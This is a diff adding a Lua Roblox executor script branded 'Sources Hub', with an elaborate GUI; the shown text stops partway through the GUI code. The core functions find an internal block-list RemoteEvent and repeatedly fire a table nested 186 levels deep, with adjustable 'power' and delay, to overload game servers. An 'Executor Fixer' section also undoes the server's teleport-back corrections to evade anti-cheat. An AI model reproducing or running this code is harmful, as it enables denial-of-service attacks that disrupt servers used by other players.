@@ -1,0 +1,1117 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local ContentProvider = game:GetService("ContentProvider")
+local RenderSettings = settings().Rendering
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+if playerGui:FindFirstChild("SourcesHubGUI") then
+    playerGui.SourcesHubGUI:Destroy()
+end
+
+local CONFIG = {
+    MAX_POWER = 150000,
+    MIN_POWER = 10000,
+    STEP = 1000,
+    MAX_DELAY = 0.5,
+    MIN_DELAY = 0.001,
+    DEPTH = 186,
+    REMOTE_NAMES = {"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"},
+    DISCORD = "https://discord.gg/sourceshubs",
+    SAVE_FILE = "SourcesHub_Config.json",
+    SAVE_INTERVAL = 8
+}
+
+local State = {
+    running = false,
+    bypassEnabled = false,
+    mode = "Mobile",
+    power = { PC = 100000, Mobile = 72000 },
+    spamDelay = 0.125,
+    keybind = Enum.KeyCode.C,
+    thread = nil,
+    payload = nil,
+    remote = nil,
+    lastSaveHash = "",
+    executorFixer = false,
+    executorFixerThreads = {},
+    activeVersion = "V1",
+    v1Delay = 0.125,
+}
+
+local canFile = (writefile and readfile and isfile) and true or false
+
+local function getStateHash()
+    return State.power.PC .. "_" .. State.power.Mobile .. "_" .. State.mode .. "_" .. State.keybind.Name
+end
+
+local function saveConfig()
+    if not canFile then return end
+    local hash = getStateHash()
+    if hash == State.lastSaveHash then return end
+    State.lastSaveHash = hash
+    local data = HttpService:JSONEncode({
+        powerPC = State.power.PC,
+        powerMobile = State.power.Mobile,
+        mode = State.mode,
+        keybind = State.keybind.Name
+    })
+    task.defer(function() pcall(writefile, CONFIG.SAVE_FILE, data) end)
+end
+
+local function loadConfig()
+    if not canFile then return false end
+    local ok, result = pcall(function()
+        if not isfile(CONFIG.SAVE_FILE) then return nil end
+        return HttpService:JSONDecode(readfile(CONFIG.SAVE_FILE))
+    end)
+    if not ok or not result then return false end
+    if result.powerPC then State.power.PC = math.clamp(result.powerPC, CONFIG.MIN_POWER, CONFIG.MAX_POWER) end
+    if result.powerMobile then State.power.Mobile = math.clamp(result.powerMobile, CONFIG.MIN_POWER, 100000) end
+    if result.mode and (result.mode == "PC" or result.mode == "Mobile") then State.mode = result.mode end
+    if result.keybind then
+        local s, kc = pcall(function() return Enum.KeyCode[result.keybind] end)
+        if s and kc then State.keybind = kc end
+    end
+    State.lastSaveHash = getStateHash()
+    return true
+end
+
+loadConfig()
+
+local autoSaveAlive = true
+task.defer(function()
+    while autoSaveAlive do
+        task.wait(CONFIG.SAVE_INTERVAL)
+        saveConfig()
+    end
+end)
+
+--// Executor Fixer
+local ExecutorFixer = {}
+local OriginalValues = {
+    qualityLevel = nil,
+    lightingEffects = {},
+    globalShadows = nil,
+    fogEnd = nil,
+    meshLOD = nil,
+}
+
+local PingStats = {
+    current = 0,
+    avg = 0,
+    samples = {},
+    maxSamples = 30,
+    lastTeleportBlock = 0,
+    tpbCount = 0,
+}
+
+local function measurePing()
+    local ok, v = pcall(function()
+        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+    end)
+    if ok and type(v) == "number" and v > 0 then return v end
+    local t = tick()
+    RunService.Heartbeat:Wait()
+    return (tick() - t) * 1000
+end
+
+local function updatePingStats()
+    local p = measurePing()
+    PingStats.current = p
+    table.insert(PingStats.samples, p)
+    if #PingStats.samples > PingStats.maxSamples then table.remove(PingStats.samples, 1) end
+    local s = 0
+    for _, v in ipairs(PingStats.samples) do s = s + v end
+    PingStats.avg = s / #PingStats.samples
+end
+
+local function applyGraphicsNuke()
+    OriginalValues.qualityLevel = RenderSettings.QualityLevel
+    pcall(function() RenderSettings.QualityLevel = Enum.QualityLevel.Level01 end)
+    pcall(function()
+        for _, effect in ipairs(Lighting:GetChildren()) do
+            if effect:IsA("PostEffect") or effect:IsA("Sky") then
+                OriginalValues.lightingEffects[effect] = effect.Enabled ~= nil and effect.Enabled or true
+                if effect.Enabled ~= nil then effect.Enabled = false end
+            end
+        end
+    end)
+    pcall(function()
+        OriginalValues.globalShadows = Lighting.GlobalShadows
+        OriginalValues.fogEnd = Lighting.FogEnd
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 100000
+        Lighting.Brightness = 2
+    end)
+    pcall(function()
+        if Workspace:FindFirstChildOfClass("Terrain") then
+            Workspace:FindFirstChildOfClass("Terrain").Decoration = false
+        end
+    end)
+    pcall(function()
+        OriginalValues.meshLOD = settings().Rendering.MeshPartDetailLevel
+        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Disabled
+    end)
+    pcall(function()
+        if Workspace.CurrentCamera then
+            Workspace.CurrentCamera.FieldOfView = 70
+        end
+    end)
+    pcall(function()
+        for _, v in ipairs(Workspace:GetDescendants()) do
+            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke")
+            or v:IsA("Fire") or v:IsA("Sparkles") then
+                v.Enabled = false
+            end
+        end
+    end)
+end
+
+local function restoreGraphics()
+    pcall(function()
+        if OriginalValues.qualityLevel then
+            RenderSettings.QualityLevel = OriginalValues.qualityLevel
+        end
+    end)
+    pcall(function()
+        for effect, wasEnabled in pairs(OriginalValues.lightingEffects) do
+            if effect and effect.Parent then effect.Enabled = wasEnabled end
+        end
+        OriginalValues.lightingEffects = {}
+    end)
+    pcall(function()
+        Lighting.GlobalShadows = OriginalValues.globalShadows ~= nil and OriginalValues.globalShadows or true
+        Lighting.FogEnd = OriginalValues.fogEnd or 100000
+    end)
+    pcall(function()
+        if Workspace:FindFirstChildOfClass("Terrain") then
+            Workspace:FindFirstChildOfClass("Terrain").Decoration = true
+        end
+    end)
+    pcall(function()
+        if OriginalValues.meshLOD then
+            settings().Rendering.MeshPartDetailLevel = OriginalValues.meshLOD
+        end
+    end)
+    pcall(function()
+        for _, v in ipairs(Workspace:GetDescendants()) do
+            if v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke")
+            or v:IsA("Fire") or v:IsA("Sparkles") then
+                v.Enabled = true
+            end
+        end
+    end)
+end
+
+local function startAntiTPBack()
+    local char = player.Character or player.CharacterAdded:Wait()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local lastGoodPos = hrp and hrp.Position or Vector3.new(0, 0, 0)
+    local lastGoodTime = tick()
+    local TPB_THRESHOLD = 40
+    local TPB_TIMEWINDOW = 0.2
+
+    local t = task.spawn(function()
+        while State.executorFixer do
+            task.wait(0.05)
+            if not char or not char.Parent then
+                char = player.Character
+                if not char then task.wait(1) continue end
+                hrp = char:FindFirstChild("HumanoidRootPart")
+                if not hrp then task.wait(0.5) continue end
+                lastGoodPos = hrp.Position
+                lastGoodTime = tick()
+            end
+            if not hrp or not hrp.Parent then
+                hrp = char:FindFirstChild("HumanoidRootPart")
+                continue
+            end
+            local currentPos = hrp.Position
+            local dist = (currentPos - lastGoodPos).Magnitude
+            local dt = tick() - lastGoodTime
+            if dist > TPB_THRESHOLD and dt < TPB_TIMEWINDOW then
+                pcall(function() hrp.CFrame = CFrame.new(lastGoodPos) end)
+                PingStats.lastTeleportBlock = tick()
+                PingStats.tpbCount = PingStats.tpbCount + 1
+            else
+                if dt >= 0.3 then
+                    lastGoodPos = currentPos
+                    lastGoodTime = tick()
+                end
+            end
+        end
+    end)
+
+    local respawnConn
+    respawnConn = player.CharacterAdded:Connect(function(newChar)
+        if not State.executorFixer then respawnConn:Disconnect() return end
+        task.wait(1)
+        char = newChar
+        hrp = newChar:WaitForChild("HumanoidRootPart", 5)
+        if hrp then
+            lastGoodPos = hrp.Position
+            lastGoodTime = tick()
+        end
+    end)
+
+    return t, respawnConn
+end
+
+local function startNetworkOptimizer()
+    return task.spawn(function()
+        local gcTick = 0
+        while State.executorFixer do
+            task.wait(0.25)
+            gcTick = gcTick + 1
+            updatePingStats()
+            if State.running and State.activeVersion == "V2" then
+                if PingStats.avg > 300 then
+                    State.spamDelay = math.min(State.spamDelay * 1.3, CONFIG.MAX_DELAY)
+                elseif PingStats.avg > 150 then
+                    State.spamDelay = math.min(State.spamDelay * 1.05, CONFIG.MAX_DELAY)
+                elseif PingStats.avg < 60 then
+                    State.spamDelay = math.max(State.spamDelay * 0.97, CONFIG.MIN_DELAY)
+                end
+            end
+            pcall(function()
+                if Workspace.CurrentCamera then
+                    player.ReplicationFocus = Workspace.CurrentCamera
+                end
+            end)
+            if gcTick % 60 == 0 then
+                task.defer(function()
+                    pcall(function() ContentProvider:PreloadAsync({}) end)
+                end)
+            end
+        end
+    end)
+end
+
+local function startFPSStabilizer()
+    return task.spawn(function()
+        local lastT = tick()
+        local gcFrame = 0
+        while State.executorFixer do
+            RunService.Heartbeat:Wait()
+            gcFrame = gcFrame + 1
+            if gcFrame >= 200 then
+                gcFrame = 0
+                task.defer(function()
+                    local _ = {}
+                    for i = 1, 1000 do _[i] = i end
+                    _ = nil
+                end)
+            end
+            local now = tick()
+            if now - lastT >= 2 then
+                lastT = now
+                pcall(function()
+                    if RenderSettings.QualityLevel ~= Enum.QualityLevel.Level01 then
+                        RenderSettings.QualityLevel = Enum.QualityLevel.Level01
+                    end
+                    Lighting.GlobalShadows = false
+                end)
+            end
+        end
+    end)
+end
+
+function ExecutorFixer.start()
+    if State.executorFixer then return end
+    State.executorFixer = true
+    applyGraphicsNuke()
+    local t1 = startFPSStabilizer()
+    local t2 = startNetworkOptimizer()
+    local t3, conn3 = startAntiTPBack()
+    State.executorFixerThreads = {t1, t2, t3, conn3}
+end
+
+function ExecutorFixer.stop()
+    State.executorFixer = false
+    for _, v in ipairs(State.executorFixerThreads) do
+        if type(v) == "thread" then pcall(task.cancel, v)
+        elseif type(v) == "table" and v.Disconnect then pcall(function() v:Disconnect() end) end
+    end
+    State.executorFixerThreads = {}
+    restoreGraphics()
+    pcall(function() player.ReplicationFocus = nil end)
+end
+
+--// Core bypasses
+local function findRemote()
+    local ok, rrs = pcall(function()
+        return game:GetService("RobloxReplicatedStorage")
+    end)
+    if not ok or not rrs then return nil end
+    for _, name in ipairs(CONFIG.REMOTE_NAMES) do
+        local r = rrs:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then return r end
+    end
+    for _, c in ipairs(rrs:GetChildren()) do
+        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
+    end
+    return nil
+end
+
+local function buildPayload(power)
+    local main = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, CONFIG.DEPTH do
+        local n = {}
+        table.insert(current, n)
+        current = n
+    end
+    local maxRep = math.min(math.floor(power / (CONFIG.DEPTH + 2)), 10000)
+    for _ = 1, maxRep do table.insert(main, nested) end
+    return main
+end
+
+local function stopExecution()
+    if State.thread then pcall(task.cancel, State.thread) State.thread = nil end
+    State.payload = nil
+end
+
+local function startExecution()
+    if not State.remote then State.remote = findRemote() end
+    
+    if State.activeVersion == "V1" then
+        local power = State.power[State.mode] or 100000
+        State.payload = buildPayload(power)
+        State.thread = task.spawn(function()
+            while State.running do
+                if State.remote and State.payload then
+                    pcall(function() State.remote:FireServer(State.payload) end)
+                end
+                task.wait(State.v1Delay or 0.125)
+            end
+        end)
+    else
+        State.payload = buildPayload(State.power[State.mode])
+        local delay = State.spamDelay
+        State.thread = task.spawn(function()
+            while State.running do
+                if State.remote and State.payload then
+                    local ok = pcall(function() State.remote:FireServer(State.payload) end)
+                    if not ok then delay = math.min(delay * 1.5, CONFIG.MAX_DELAY)
+                    else delay = math.max(delay * 0.995, CONFIG.MIN_DELAY) end
+                end
+                task.wait(delay)
+            end
+        end)
+    end
+end
+
+--// GUI Initialization
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SourcesHubGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = playerGui
+
+ScreenGui.Destroying:Connect(function()
+    autoSaveAlive = false
+    saveConfig()
+    ExecutorFixer.stop()
+end)
+
+local Main = Instance.new("Frame")
+Main.Name = "Main"
+Main.Size = UDim2.new(0, 280, 0, 215)
+Main.Position = UDim2.new(0.5, -140, 0.5, -107)
+Main.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
+Main.BackgroundTransparency = 0.25
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Draggable = true
+Main.ClipsDescendants = true
+Main.Parent = ScreenGui
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 14)
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(80, 80, 90)
+MainStroke.Thickness = 1
+MainStroke.Transparency = 0.3
+MainStroke.Parent = Main
+
+local Background = Instance.new("ImageLabel")
+Background.Size = UDim2.new(1, 0, 1, 0)
+Background.BackgroundTransparency = 1
+Background.Image = "rbxassetid://93857225029776"
+Background.ImageTransparency = 0.15
+Background.ScaleType = Enum.ScaleType.Crop
+Background.ZIndex = 1
+Background.Parent = Main
+Instance.new("UICorner", Background).CornerRadius = UDim.new(0, 14)
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0, 0, 0, 20)
+Title.Position = UDim2.new(0, 12, 0, 8)
+Title.BackgroundTransparency = 1
+Title.Text = "Sources Hub"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.ZIndex = 10
+Title.Parent = Main
+
+local TitleStroke = Instance.new("UIStroke")
+TitleStroke.Color = Color3.fromRGB(0, 0, 0)
+TitleStroke.Thickness = 1
+TitleStroke.Transparency = 0.5
+TitleStroke.Parent = Title
+
+local DiscordHolder = Instance.new("TextButton")
+DiscordHolder.Size = UDim2.new(0, 140, 0, 16)
+DiscordHolder.Position = UDim2.new(0, 12, 0, 28)
+DiscordHolder.BackgroundTransparency = 1
+DiscordHolder.Text = "discord.gg/sourceshubs"
+DiscordHolder.TextColor3 = Color3.fromRGB(140, 150, 255)
+DiscordHolder.Font = Enum.Font.GothamBold
+DiscordHolder.TextSize = 11
+DiscordHolder.TextXAlignment = Enum.TextXAlignment.Left
+DiscordHolder.AutoButtonColor = false
+DiscordHolder.ZIndex = 10
+DiscordHolder.Parent = Main
+
+local DcTextStroke = Instance.new("UIStroke")
+DcTextStroke.Color = Color3.fromRGB(0, 0, 0)
+DcTextStroke.Thickness = 1
+DcTextStroke.Transparency = 0.5
+DcTextStroke.Parent = DiscordHolder
+
+local DiscordGrad = Instance.new("UIGradient")
+DiscordGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(88, 101, 242)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 200, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(88, 101, 242))
+})
+DiscordGrad.Parent = DiscordHolder
+
+task.spawn(function()
+    local t = 0
+    while DiscordHolder and DiscordHolder.Parent do
+        t = t + 0.04
+        DiscordGrad.Offset = Vector2.new(math.sin(t) * 0.6, 0)
+        task.wait(0.03)
+    end
+end)
+
+DiscordHolder.MouseButton1Click:Connect(function()
+    if setclipboard then pcall(setclipboard, CONFIG.DISCORD)
+    elseif toclipboard then pcall(toclipboard, CONFIG.DISCORD) end
+    local old = DiscordHolder.Text
+    DiscordHolder.Text = "Link copied!"
+    task.delay(1.2, function() if DiscordHolder then DiscordHolder.Text = old end end)
+end)
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 18, 0, 18)
+CloseBtn.Position = UDim2.new(1, -22, 0, 8)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 13
+CloseBtn.ZIndex = 15
+CloseBtn.Parent = Main
+
+CloseBtn.MouseButton1Click:Connect(function()
+    stopExecution()
+    ExecutorFixer.stop()
+    autoSaveAlive = false
+    saveConfig()
+    ScreenGui:Destroy()
+end)
+
+local MinimizeBtn = Instance.new("TextButton")
+MinimizeBtn.Size = UDim2.new(0, 18, 0, 18)
+MinimizeBtn.Position = UDim2.new(1, -48, 0, 8)
+MinimizeBtn.BackgroundTransparency = 1
+MinimizeBtn.Text = "-"
+MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeBtn.Font = Enum.Font.GothamBold
+MinimizeBtn.TextSize = 14
+MinimizeBtn.ZIndex = 15
+MinimizeBtn.Parent = Main
+
+-- V2 placed down relative to the X button with horizontal spacing
+local V2Btn = Instance.new("TextButton")
+V2Btn.Size = UDim2.new(0, 30, 0, 18)
+V2Btn.Position = UDim2.new(1, -34, 0, 32)
+V2Btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+V2Btn.Text = "V2"
+V2Btn.TextColor3 = Color3.fromRGB(180, 180, 190)
+V2Btn.Font = Enum.Font.GothamBold
+V2Btn.TextSize = 10
+V2Btn.ZIndex = 15
+V2Btn.Parent = Main
+Instance.new("UICorner", V2Btn).CornerRadius = UDim.new(0, 6)
+
+-- V1 placed down relative to the minimize button with horizontal spacing
+local V1Btn = Instance.new("TextButton")
+V1Btn.Size = UDim2.new(0, 30, 0, 18)
+V1Btn.Position = UDim2.new(1, -68, 0, 32)
+V1Btn.BackgroundColor3 = Color3.fromRGB(70, 70, 85)
+V1Btn.Text = "V1"
+V1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+V1Btn.Font = Enum.Font.GothamBold
+V1Btn.TextSize = 10
+V1Btn.ZIndex = 15
+V1Btn.Parent = Main
+Instance.new("UICorner", V1Btn).CornerRadius = UDim.new(0, 6)
+
+local isOpen = true
+
+MinimizeBtn.MouseButton1Click:Connect(function()
+    isOpen = not isOpen
+    
+    local twInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+    local targetHeight = isOpen and 215 or 54
+    
+    TweenService:Create(Main, twInfo, {
+        Size = UDim2.new(0, 280, 0, targetHeight)
+    }):Play()
+    
+    V1Container.Visible = isOpen and (State.activeVersion == "V1")
+    V2Container.Visible = isOpen and (State.activeVersion == "V2")
+end)
+
+local function makePill(yPos, parent)
+    local pill = Instance.new("Frame")
+    pill.Size = UDim2.new(1, -24, 0, 32)
+    pill.Position = UDim2.new(0, 12, 0, yPos)
+    pill.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
+    pill.BackgroundTransparency = 0.35
+    pill.ZIndex = 10
+    pill.Parent = parent
+    Instance.new("UICorner", pill).CornerRadius = UDim.new(1, 0)
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(60, 60, 70)
+    stroke.Thickness = 1
+    stroke.Transparency = 0.5
+    stroke.Parent = pill
+    return pill
+end
+
+local function makeToggle(parent)
+    local tpill = Instance.new("TextButton")
+    tpill.Size = UDim2.new(0, 36, 0, 16)
+    tpill.Position = UDim2.new(1, -44, 0.5, -8)
+    tpill.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    tpill.Text = ""
+    tpill.AutoButtonColor = false
+    tpill.ZIndex = 11
+    tpill.Parent = parent
+    Instance.new("UICorner", tpill).CornerRadius = UDim.new(1, 0)
+    local dot = Instance.new("Frame")
+    dot.Size = UDim2.new(0, 12, 0, 12)
+    dot.Position = UDim2.new(0, 2, 0.5, -6)
+    dot.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
+    dot.ZIndex = 12
+    dot.Parent = tpill
+    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
+    return tpill, dot
+end
+
+local function makeLabel(parent, text, xOffset, width)
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(0, width or 160, 1, 0)
+    lbl.Position = UDim2.new(0, xOffset or 12, 0, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 11
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.ZIndex = 11
+    lbl.Parent = parent
+    return lbl
+end
+
+local V1Container = Instance.new("Frame")
+V1Container.Size = UDim2.new(1, 0, 1, -52)
+V1Container.Position = UDim2.new(0, 0, 0, 52)
+V1Container.BackgroundTransparency = 1
+V1Container.Visible = true
+V1Container.Parent = Main
+
+local V2Container = Instance.new("Frame")
+V2Container.Size = UDim2.new(1, 0, 1, -52)
+V2Container.Position = UDim2.new(0, 0, 0, 52)
+V2Container.BackgroundTransparency = 1
+V2Container.Visible = false
+V2Container.Parent = Main
+
+local V1BypassPill = makePill(2, V1Container)
+local V1BypassLabel = makeLabel(V1BypassPill, "Bypass: OFF", 12, 110)
+
+local V1KeybindBtn = Instance.new("TextButton")
+V1KeybindBtn.Size = UDim2.new(0, 42, 0, 18)
+V1KeybindBtn.Position = UDim2.new(1, -96, 0.5, -9)
+V1KeybindBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+V1KeybindBtn.Text = "[" .. State.keybind.Name .. "]"
+V1KeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
+V1KeybindBtn.Font = Enum.Font.GothamBold
+V1KeybindBtn.TextSize = 10
+V1KeybindBtn.ZIndex = 12
+V1KeybindBtn.Parent = V1BypassPill
+Instance.new("UICorner", V1KeybindBtn).CornerRadius = UDim.new(1, 0)
+
+local V1TogglePill, V1ToggleDot = makeToggle(V1BypassPill)
+
+local V1PowerPill = makePill(38, V1Container)
+local V1PwrLabel = makeLabel(V1PowerPill, "Pwr", 12, 30)
+
+local V1ValuePill = Instance.new("Frame")
+V1ValuePill.Size = UDim2.new(0, 150, 0, 22)
+V1ValuePill.Position = UDim2.new(0, 48, 0.5, -11)
+V1ValuePill.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+V1ValuePill.ZIndex = 11
+V1ValuePill.Parent = V1PowerPill
+Instance.new("UICorner", V1ValuePill).CornerRadius = UDim.new(1, 0)
+
+local V1MinusBtn = Instance.new("TextButton")
+V1MinusBtn.Size = UDim2.new(0, 18, 0, 18)
+V1MinusBtn.Position = UDim2.new(0, 2, 0.5, -9)
+V1MinusBtn.BackgroundTransparency = 1
+V1MinusBtn.Text = "-"
+V1MinusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+V1MinusBtn.Font = Enum.Font.GothamBlack
+V1MinusBtn.TextSize = 13
+V1MinusBtn.ZIndex = 12
+V1MinusBtn.Parent = V1ValuePill
+
+local V1PowerDisplay = Instance.new("TextBox")
+V1PowerDisplay.Size = UDim2.new(1, -36, 1, 0)
+V1PowerDisplay.Position = UDim2.new(0, 18, 0, 0)
+V1PowerDisplay.BackgroundTransparency = 1
+V1PowerDisplay.Text = tostring(State.power[State.mode])
+V1PowerDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
+V1PowerDisplay.Font = Enum.Font.GothamBlack
+V1PowerDisplay.TextSize = 11
+V1PowerDisplay.ZIndex = 12
+V1PowerDisplay.Parent = V1ValuePill
+
+local V1PlusBtn = Instance.new("TextButton")
+V1PlusBtn.Size = UDim2.new(0, 18, 0, 18)
+V1PlusBtn.Position = UDim2.new(1, -20, 0.5, -9)
+V1PlusBtn.BackgroundTransparency = 1
+V1PlusBtn.Text = "+"
+V1PlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+V1PlusBtn.Font = Enum.Font.GothamBlack
+V1PlusBtn.TextSize = 13
+V1PlusBtn.ZIndex = 12
+V1PlusBtn.Parent = V1ValuePill
+
+local V1DelayPill = makePill(74, V1Container)
+local V1DelayLabel = makeLabel(V1DelayPill, "Delay", 12, 35)
+
+local V1DelayValuePill = Instance.new("Frame")
+V1DelayValuePill.Size = UDim2.new(0, 150, 0, 22)
+V1DelayValuePill.Position = UDim2.new(0, 48, 0.5, -11)
+V1DelayValuePill.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+V1DelayValuePill.ZIndex = 11
+V1DelayValuePill.Parent = V1DelayPill
+Instance.new("UICorner", V1DelayValuePill).CornerRadius = UDim.new(1, 0)
+
+local V1DelayMinus = Instance.new("TextButton")
+V1DelayMinus.Size = UDim2.new(0, 18, 0, 18)
+V1DelayMinus.Position = UDim2.new(0, 2, 0.5, -9)
+V1DelayMinus.BackgroundTransparency = 1
+V1DelayMinus.Text = "-"
+V1DelayMinus.TextColor3 = Color3.fromRGB(255, 255, 255)
+V1DelayMinus.Font = Enum.Font.GothamBlack
+V1DelayMinus.TextSize = 13
+V1DelayMinus.ZIndex = 12
+V1DelayMinus.Parent = V1DelayValuePill
+
+local V1DelayDisplay = Instance.new("TextBox")
+V1DelayDisplay.Size = UDim2.new(1, -36, 1, 0)
+V1DelayDisplay.Position = UDim2.new(0, 18, 0, 0)
+V1DelayDisplay.BackgroundTransparency = 1
+V1DelayDisplay.Text = string.format("%.3f", State.v1Delay)
+V1DelayDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
+V1DelayDisplay.Font = Enum.Font.GothamBlack
+V1DelayDisplay.TextSize = 11
+V1DelayDisplay.ZIndex = 12
+V1DelayDisplay.Parent = V1DelayValuePill
+
+local V1DelayPlus = Instance.new("TextButton")
+V1DelayPlus.Size = UDim2.new(0, 18, 0, 18)
+V1DelayPlus.Position = UDim2.new(1, -20, 0.5, -9)
+V1DelayPlus.BackgroundTransparency = 1
+V1DelayPlus.Text = "+"
+V1DelayPlus.TextColor3 = Color3.fromRGB(255, 255, 255)
+V1DelayPlus.Font = Enum.Font.GothamBlack
+V1DelayPlus.TextSize = 13
+V1DelayPlus.ZIndex = 12
+V1DelayPlus.Parent = V1DelayValuePill
+
+local V1StatsPill = makePill(110, V1Container)
+local V1StatsLabel = makeLabel(V1StatsPill, "FPS: --   Ping: -- ms   TPB: 0", 12, 240)
+V1StatsLabel.Font = Enum.Font.Gotham
+V1StatsLabel.TextSize = 9
+
+task.spawn(function()
+    local frameCount = 0
+    local lastT = tick()
+    local conn = RunService.RenderStepped:Connect(function()
+        frameCount = frameCount + 1
+    end)
+
+    while true do
+        task.wait(0.5)
+        if not (V1StatsLabel and V1StatsLabel.Parent) then conn:Disconnect() break end
+        local now = tick()
+        local fps = math.floor(frameCount / (now - lastT))
+        frameCount = 0
+        lastT = now
+
+        if not State.executorFixer then
+            local p = measurePing()
+            PingStats.current = p
+        end
+        local ping = math.floor(PingStats.current)
+        local statsText = string.format("FPS: %d   Ping: %d ms   TPB: %d", fps, ping, PingStats.tpbCount)
+        V1StatsLabel.Text = statsText
+    end
+end)
+
+local BypassPill = makePill(2, V2Container)
+local BypassLabel = makeLabel(BypassPill, "Bypass: OFF", 12, 110)
+
+local KeybindBtn = Instance.new("TextButton")
+KeybindBtn.Size = UDim2.new(0, 42, 0, 18)
+KeybindBtn.Position = UDim2.new(1, -96, 0.5, -9)
+KeybindBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+KeybindBtn.Text = "[" .. State.keybind.Name .. "]"
+KeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
+KeybindBtn.Font = Enum.Font.GothamBold
+KeybindBtn.TextSize = 10
+KeybindBtn.ZIndex = 12
+KeybindBtn.Parent = BypassPill
+Instance.new("UICorner", KeybindBtn).CornerRadius = UDim.new(1, 0)
+
+local TogglePill, ToggleDot = makeToggle(BypassPill)
+
+local PowerPill = makePill(38, V2Container)
+local PwrLabel = makeLabel(PowerPill, "Pwr", 12, 30)
+
+local ValuePill = Instance.new("Frame")
+ValuePill.Size = UDim2.new(0, 95, 0, 22)
+ValuePill.Position = UDim2.new(0, 42, 0.5, -11)
+ValuePill.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+ValuePill.ZIndex = 11
+ValuePill.Parent = PowerPill
+Instance.new("UICorner", ValuePill).CornerRadius = UDim.new(1, 0)
+
+local MinusBtn = Instance.new("TextButton")
+MinusBtn.Size = UDim2.new(0, 18, 0, 18)
+MinusBtn.Position = UDim2.new(0, 2, 0.5, -9)
+MinusBtn.BackgroundTransparency = 1
+MinusBtn.Text = "-"
+MinusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinusBtn.Font = Enum.Font.GothamBlack
+MinusBtn.TextSize = 13
+MinusBtn.ZIndex = 12
+MinusBtn.Parent = ValuePill
+
+local PowerDisplay = Instance.new("TextLabel")
+PowerDisplay.Size = UDim2.new(1, -36, 1, 0)
+PowerDisplay.Position = UDim2.new(0, 18, 0, 0)
+PowerDisplay.BackgroundTransparency = 1
+PowerDisplay.Text = tostring(State.power[State.mode])
+PowerDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
+PowerDisplay.Font = Enum.Font.GothamBlack
+PowerDisplay.TextSize = 11
+PowerDisplay.ZIndex = 12
+PowerDisplay.Parent = ValuePill
+
+local PlusBtn = Instance.new("TextButton")
+PlusBtn.Size = UDim2.new(0, 18, 0, 18)
+PlusBtn.Position = UDim2.new(1, -20, 0.5, -9)
+PlusBtn.BackgroundTransparency = 1
+PlusBtn.Text = "+"
+PlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+PlusBtn.Font = Enum.Font.GothamBlack
+PlusBtn.TextSize = 13
+PlusBtn.ZIndex = 12
+PlusBtn.Parent = ValuePill
+
+local PcBtn = Instance.new("TextButton")
+PcBtn.Size = UDim2.new(0, 28, 0, 22)
+PcBtn.Position = UDim2.new(0, 142, 0.5, -11)
+PcBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+PcBtn.Text = "PC"
